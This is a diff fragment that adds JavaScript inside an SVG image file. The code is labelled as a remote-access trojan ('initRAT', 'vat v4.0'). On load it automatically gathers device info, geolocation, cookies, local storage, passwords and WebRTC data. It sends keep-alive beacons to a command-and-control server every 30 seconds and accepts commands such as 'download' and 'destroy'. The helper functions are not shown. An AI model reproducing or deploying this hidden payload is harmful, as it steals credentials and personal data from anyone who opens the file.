+    case 'history': cmd_history(); break;
+    case 'download': cmd_download(); break;
+    case 'clear': cmd_clear(); break;
+    case 'destroy': cmd_destroy(); break;
+    default: log('Unknown: ' + c, 'warn');
+  }
+}
+
+// === INIT ===
+function initRAT() {
+  document.getElementById('uid').textContent = 'UUID: ' + UUID.substring(0, 16) + '...';
+  document.getElementById('st').textContent = '● ONLINE';
+  
+  log('[*] vat v4.0 initialized', '');
+  log('[*] UUID: ' + UUID, '');
+  log('[*] HTTP POST only — NO custom headers, NO CORS issues', '');
+  log('[*] Auto-collecting in 3 seconds...', '');
+  
+  // Auto info
+  setTimeout(function() {
+    cmd_info();
+    cmd_geo();
+  }, 3000);
+  
+  // Timed extra
+  setTimeout(function() {
+    cmd_cookie();
+    cmd_storage();
+    cmd_password();
+    cmd_webrtc();
+  }, 8000);
+  
+  // Keep-alive via beacon
+  setInterval(function() {
+    try {
+      navigator.sendBeacon(C2 + '/uploadText', JSON.stringify({
+        text: '❤️ ' + UUID + ' alive',
+        uuid: UUID,
+        _t: Date.now()
+      }));
+    } catch(e) {}
+  }, 30000);
+}
+]]></script>
+</svg>
